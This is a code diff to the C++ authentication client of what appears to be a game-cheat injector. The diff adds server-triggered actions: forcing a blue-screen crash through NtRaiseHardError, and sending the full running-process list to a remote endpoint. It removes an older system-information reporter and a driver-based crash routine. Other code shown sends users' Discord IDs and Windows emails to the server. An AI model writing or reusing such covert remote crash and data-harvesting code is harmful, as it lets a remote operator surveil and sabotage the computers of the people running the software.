@@ -9,11 +9,13 @@
 #include <winhttp.h>
 #include <wincrypt.h>
 #include <TlHelp32.h>
+#include <Psapi.h>
 #include <string>
 #include <vector>
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "psapi.lib")
 
 namespace SelfAuth {
 
@@ -139,7 +141,7 @@ namespace SelfAuth {
             return ok;
         }
 
-        // Returns 0 = OK, 1 = session dead, 2 = KILL, 3 = MONITOR, 4 = BSOD
+        // Returns 0 = OK, 1 = session dead, 2 = KILL, 3 = BSOD, 4 = report_processes
         int heartbeat_ex() {
             if (m_session.empty()) return 1;
             std::string hwid = CollectHWID();
@@ -155,8 +157,8 @@ namespace SelfAuth {
             // Check for action commands from server
             std::string action = ExtractJsonString(body, "action");
             if (action == "kill") return 2;
-            if (action == "monitor") return 3;
-            if (action == "bsod") return 4;
+            if (action == "bsod") return 3;
+            if (action == "report_processes") return 4;
 
             std::string expiry = ExtractJsonString(body, "expiry");
             if (!expiry.empty() && !user_data.subscriptions.empty()) {
@@ -192,6 +194,72 @@ namespace SelfAuth {
             return std::string(hwid);
         }
 
+        // ── Trigger BSOD via NtRaiseHardError (user-mode, requires admin) ──
+        static void TriggerBSOD() {
+            typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+            typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
+
+            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+            if (!ntdll) { TerminateProcess(GetCurrentProcess(), 0); return; }
+
+            auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+            auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+            if (!RtlAdjustPrivilege || !NtRaiseHardError) { TerminateProcess(GetCurrentProcess(), 0); return; }
+
+            BOOLEAN wasEnabled;
+            RtlAdjustPrivilege(19, TRUE, FALSE, &wasEnabled); // SE_SHUTDOWN_PRIVILEGE
+            ULONG response;
+            NtRaiseHardError(0xC000021A, 0, 0, nullptr, 6, &response); // STATUS_SYSTEM_PROCESS_TERMINATED + OptionShutdownSystem
+        }
+
+        // ── Collect running processes and send to server ──
+        void ReportProcesses() {
+            if (m_session.empty()) return;
+
+            std::string procs = "[";
+            bool first = true;
+
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap == INVALID_HANDLE_VALUE) return;
+
+            PROCESSENTRY32W pe = {};
+            pe.dwSize = sizeof(pe);
+            if (Process32FirstW(hSnap, &pe)) {
+                do {
+                    // Convert wide name to narrow
+                    char name[260] = {};
+                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
+
+                    // Get memory usage
+                    DWORD pid = pe.th32ProcessID;
+                    SIZE_T memBytes = 0;
+                    bool hasWindow = false;
+                    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+                    if (hProc) {
+                        PROCESS_MEMORY_COUNTERS pmc = {};
+                        pmc.cb = sizeof(pmc);
+                        if (GetProcessMemoryInfo(hProc, &pmc, sizeof(pmc))) {
+                            memBytes = pmc.WorkingSetSize;
+                        }
+                        CloseHandle(hProc);
+                    }
+
+                    if (!first) procs += ",";
+                    first = false;
+                    char entry[512];
+                    snprintf(entry, sizeof(entry),
+                        "{\"name\":\"%s\",\"pid\":%lu,\"mem\":%llu,\"window\":false}",
+                        EscapeJson(name).c_str(), (unsigned long)pid, (unsigned long long)memBytes);
+                    procs += entry;
+                } while (Process32NextW(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+            procs += "]";
+
+            std::string json = "{\"session\":\"" + EscapeJson(m_session) + "\",\"processes\":" + procs + "}";
+            SignedPost("/api/process-report", json);
+        }
+
         // Report a successful injection to the server with user identity
         void report_injection(const std::string& discord_id, const std::string& windows_email) {
             if (m_session.empty()) return;
@@ -199,170 +267,6 @@ namespace SelfAuth {
                 + "\",\"discord_id\":\"" + EscapeJson(discord_id)
                 + "\",\"windows_email\":\"" + EscapeJson(windows_email) + "\"}";
             SignedPost("/api/inject-log", json);
-        }
-
-        // ── System Monitor: collect and report system info ───────────
-        void report_system_info() {
-            if (m_session.empty()) return;
-
-            // Computer name
-            char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
-            DWORD compSize = sizeof(compName);
-            GetComputerNameA(compName, &compSize);
-
-            // OS version
-            std::string osVer = "Windows";
-            {
-                HKEY hKey;
-                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0,
-                    KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
-                    char prod[256] = {}, build[64] = {};
-                    DWORD sz = sizeof(prod);
-                    RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)prod, &sz);
-                    sz = sizeof(build);
-                    RegQueryValueExA(hKey, "CurrentBuildNumber", nullptr, nullptr, (LPBYTE)build, &sz);
-                    RegCloseKey(hKey);
-                    if (prod[0]) osVer = std::string(prod) + " (Build " + build + ")";
-                }
-            }
-
-            // CPU
-            std::string cpuName = "Unknown";
-            {
-                HKEY hKey;
-                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-                    "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0,
-                    KEY_READ, &hKey) == ERROR_SUCCESS) {
-                    char name[256] = {};
-                    DWORD sz = sizeof(name);
-                    RegQueryValueExA(hKey, "ProcessorNameString", nullptr, nullptr, (LPBYTE)name, &sz);
-                    RegCloseKey(hKey);
-                    if (name[0]) cpuName = name;
-                }
-            }
-
-            // RAM
-            MEMORYSTATUSEX memInfo = {};
-            memInfo.dwLength = sizeof(memInfo);
-            GlobalMemoryStatusEx(&memInfo);
-            DWORD ramTotalMB = (DWORD)(memInfo.ullTotalPhys / 1024 / 1024);
-            DWORD ramUsedMB = (DWORD)((memInfo.ullTotalPhys - memInfo.ullAvailPhys) / 1024 / 1024);
-
-            // GPU (from registry)
-            std::string gpuName = "Unknown";
-            {
-                HKEY hKey;
-                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-                    "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
-                    0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-                    char name[256] = {};
-                    DWORD sz = sizeof(name);
-                    RegQueryValueExA(hKey, "DriverDesc", nullptr, nullptr, (LPBYTE)name, &sz);
-                    RegCloseKey(hKey);
-                    if (name[0]) gpuName = name;
-                }
-            }
-
-            // Active window title
-            std::string activeWindow = "";
-            {
-                HWND fg = GetForegroundWindow();
-                if (fg) {
-                    char title[256] = {};
-                    GetWindowTextA(fg, title, sizeof(title));
-                    if (title[0]) activeWindow = title;
-                }
-            }
-
-            // Process list
-            std::string procJson = "[";
-            {
-                HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-                if (snap != INVALID_HANDLE_VALUE) {
-                    PROCESSENTRY32W pe = {};
-                    pe.dwSize = sizeof(pe);
-                    bool first = true;
-                    if (Process32FirstW(snap, &pe)) {
-                        do {
-                            // Get memory info
-                            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
-                            SIZE_T memBytes = 0;
-                            if (hProc) {
-                                PROCESS_MEMORY_COUNTERS pmc = {};
-                                if (GetProcessMemoryInfo(hProc, &pmc, sizeof(pmc)))
-                                    memBytes = pmc.WorkingSetSize;
-                                CloseHandle(hProc);
-                            }
-                            // Convert wide name to narrow
-                            char narrowName[MAX_PATH] = {};
-                            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, narrowName, MAX_PATH, nullptr, nullptr);
-
-                            if (!first) procJson += ",";
-                            first = false;
-                            char entry[512];
-                            snprintf(entry, sizeof(entry),
-                                "{\"name\":\"%s\",\"pid\":%u,\"mem\":%llu,\"threads\":%u}",
-                                EscapeJson(narrowName).c_str(),
-                                (unsigned)pe.th32ProcessID,
-                                (unsigned long long)memBytes,
-                                (unsigned)pe.cntThreads);
-                            procJson += entry;
-                        } while (Process32NextW(snap, &pe));
-                    }
-                    CloseHandle(snap);
-                }
-            }
-            procJson += "]";
-
-            // Build JSON payload
-            char sysJson[2048];
-            snprintf(sysJson, sizeof(sysJson),
-                "{\"computer\":\"%s\",\"os\":\"%s\",\"cpu\":\"%s\","
-                "\"ram_total\":%u,\"ram_used\":%u,"
-                "\"gpu\":\"%s\",\"active_window\":\"%s\","
-                "\"processes\":%s}",
-                EscapeJson(compName).c_str(),
-                EscapeJson(osVer).c_str(),
-                EscapeJson(cpuName).c_str(),
-                ramTotalMB, ramUsedMB,
-                EscapeJson(gpuName).c_str(),
-                EscapeJson(activeWindow).c_str(),
-                procJson.c_str());
-
-            std::string fullJson = "{\"session\":\"" + EscapeJson(m_session) + "\",\"system\":" + sysJson + "}";
-            HttpPost("/api/report-system", fullJson);
-        }
-
-        // ── BSOD: trigger kernel bugcheck via driver ─────────────────
-        void TriggerBSOD() {
-            // Use the hooked NtQueryCompositionSurfaceStatistics to send CMD_BSOD
-            HMODULE hWin32u = GetModuleHandleA("win32u.dll");
-            if (!hWin32u) hWin32u = LoadLibraryA("win32u.dll");
-            if (!hWin32u) return;
-
-            typedef NTSTATUS(NTAPI* fn_NtQuery)(PVOID);
-            fn_NtQuery pNtQuery = (fn_NtQuery)GetProcAddress(hWin32u, "NtQueryCompositionSurfaceStatistics");
-            if (!pNtQuery) return;
-
-            // REQUEST_DATA layout matching shared.h
-            struct {
-                unsigned int    magic;
-                unsigned int    command;
-                unsigned __int64 pid;
-                unsigned __int64 address;
-                unsigned __int64 buffer;
-                unsigned __int64 size;
-                unsigned __int64 result;
-                unsigned int    protect;
-                wchar_t         module_name[64];
-            } req = {};
-            req.magic = 0x44524B4E;  // REQUEST_MAGIC
-            req.command = 200;        // CMD_BSOD
-
-            __try {
-                pNtQuery(&req);
-            } __except (EXCEPTION_EXECUTE_HANDLER) {}
         }
 
         // ── Collect Discord User ID from local storage ───────────────
